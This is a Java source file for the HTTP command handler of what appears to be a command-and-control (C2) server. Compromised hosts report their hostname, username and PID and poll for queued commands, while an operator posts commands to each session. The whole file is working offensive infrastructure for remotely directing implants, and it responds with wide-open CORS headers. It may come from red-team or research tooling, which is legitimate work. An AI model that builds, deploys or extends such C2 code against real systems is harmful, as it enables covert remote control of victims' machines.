package c2.http;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.Map;

import com.google.gson.Gson;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.session.SessionManager;

public class CommandHandler implements HttpHandler {
	private IOManager io;
	
	public CommandHandler(IOManager io) {
		this.io = io;
	}

	@Override
	public void handle(HttpExchange t) throws IOException {
		
		
		Gson gson = new Gson();
		String response = "acknowledged response";
		if (t.getRequestMethod().equals("GET")) {
		
			System.out.println(t.getRequestURI().getQuery());
	    	Map<String, String> paramMap = queryToMap(t.getRequestURI().getQuery());
	    	
	    	IOTransmission transmission = new IOTransmission();
			transmission.hostname = paramMap.get("Hostname");
			transmission.username = paramMap.get("Username");
			transmission.pid = paramMap.get("PID");
			transmission.protocol = paramMap.get("Protocol");
			transmission.isCommand = false;
			
			System.out.println("Hostname: " + transmission.hostname);
			System.out.println("Username: " + transmission.username);
			System.out.println("PID: " + transmission.pid);
			System.out.println("Protocol: " + transmission.protocol);
	    	
	    	Integer sessionId = getSessionId(transmission, io);
	    	
	    	System.out.println("Polling session: " + sessionId);
	    	
	    	String cmd = io.pollIO(sessionId);
	    	
	    	if(cmd == null) {
	    		cmd = "<NO RESP>";
	    	}
			
			transmission.response = cmd;
			
			response = gson.toJson(transmission);
		} else if (t.getRequestMethod().equals("POST")) {
			InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
			BufferedReader br = new BufferedReader(isr);
			StringBuilder file = new StringBuilder();
			String nextLine;
			while ((nextLine = br.readLine()) != null) {
				file.append(nextLine);
				file.append(System.lineSeparator());
			}
			System.out.println("Received post: " + file);
			IOTransmission iot = gson.fromJson(file.toString(), IOTransmission.class);
			System.out.println("Received iot: " + iot);
			Integer sessionId = getSessionId(iot, io);
			System.out.println("Session: " + sessionId);
			io.sendCommand(sessionId, iot.response);
			System.out.println("XMIT complete");
			iot.response = "Acknowledged command: '" + iot.response + "'";
			System.out.println("Resp: " + iot.response);
			response = gson.toJson(iot);
			System.out.println("Resp: " + response);
			
			
		
		}

		t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
		t.getResponseHeaders().add("Access-Control-Allow-Credentials", "true");
		t.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,HEAD,OPTIONS,POST,PUT");
		t.getResponseHeaders().add("Access-Control-Allow-Headers", "Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers");
		t.sendResponseHeaders(200, response.getBytes().length);
		OutputStream os = t.getResponseBody();
		os.write(response.getBytes());
		os.close();
	}
	
	//TODO: Consolidate with HTTPS Manager code
	public static Integer getSessionId(IOTransmission iot, IOManager io) {
		Integer sessionId = null;
    	if(iot.hostname == null || iot.protocol == null || iot.username == null) {
    		sessionId = 1;
    	}else {
    		String sessionUID = iot.hostname+":"+iot.username+":"+iot.protocol;
    		sessionId = io.getSessionId(sessionUID);
    	}
    	return sessionId;
	}
	
	public static Map<String, String> queryToMap(String query){
	    Map<String, String> result = new HashMap<String, String>();
	    for (String param : query.split("&")) {
	        String pair[] = param.split("=");
	        if (pair.length>1) {
	            result.put(pair[0], pair[1]);
	        }else{
	            result.put(pair[0], "");
	        }
	    }
	    return result;
	  }
}
